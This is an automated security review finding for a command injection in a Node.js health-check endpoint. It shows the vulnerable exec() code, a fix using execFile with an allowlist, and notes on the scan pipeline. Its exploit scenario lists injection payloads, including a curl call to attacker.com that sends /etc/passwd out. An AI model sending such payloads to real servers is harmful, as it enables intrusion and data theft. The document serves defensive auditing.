## Vuln 1: Command Injection — `server/index.ts:~36736`

- **Severity:** High
- **Category:** `command_injection`
- **Confidence:** 10/10

### Description

The `/api/health` endpoint passes the `service` query parameter directly into `exec()` via a template literal string with no sanitization. Node.js `exec()` spawns `/bin/sh -c <command>`, meaning the shell processes metacharacters before `ping` is invoked — the argument restrictions of `ping` itself are irrelevant.

```typescript
const service = (req.query.service as string) || "api.themoviedb.org";
exec(`ping -c 1 -W 2 ${service}`, (err, stdout) => {
  res.json({
    status: err ? "unreachable" : "healthy",
    service,
    latency: stdout.match(/time=(\d+\.?\d*)/)?.[1] || null,
  });
});
```

### Exploit Scenario

Any unauthenticated attacker can send crafted requests such as:

```
GET /api/health?service=google.com;curl%20http://attacker.com/$(cat%20/etc/passwd|base64)
GET /api/health?service=$(id%20>%20/tmp/pwned)
GET /api/health?service=x%7C%7Cwhoami
```

The shell processes `;`, `|`, `&&`, `$()` before `ping` sees the argument, granting full OS-level code execution as the Node.js process user. No authentication is required to reach this endpoint.

### Recommendation

Replace `exec()` with `execFile()` (no shell spawned) and pass arguments as an array. Optionally add an allowlist for known services:

```typescript
import { execFile } from "child_process";

const ALLOWED = new Set(["api.themoviedb.org"]);
if (!ALLOWED.has(service)) {
  return res.status(400).json({ error: "Invalid service" });
}

execFile("ping", ["-c", "1", "-W", "2", service], (err, stdout) => {
  res.json({
    status: err ? "unreachable" : "healthy",
    service,
    latency: stdout.match(/time=(\d+\.?\d*)/)?.[1] || null,
  });
});
```

## Notes on Scan Methodology

This review was conducted using a three-phase multi-agent pipeline:

1. **Identification agent** — explored the repository structure and full diff to surface candidate vulnerabilities across all modified files.
2. **Three parallel filter agents** — independently assessed each candidate finding against a strict false-positive checklist, including hard exclusions (DoS, rate limiting, secrets-on-disk, shell script command injection precedent) and confidence thresholds.
3. **Threshold filter** — findings with a filter-agent confidence score below 8/10 were excluded from the final report.

The SQL injection findings were correctly excluded (confidence 1–2/10) because the vulnerable-looking code exists only inside educational comment blocks, not in executed code. The command injection was retained because the filter agent confirmed the code exists and is reachable via unauthenticated HTTP requests; the low initial score was due to an incorrect application of the "shell scripts are not exploitable in practice" precedent, which does not apply to Node.js HTTP endpoints.
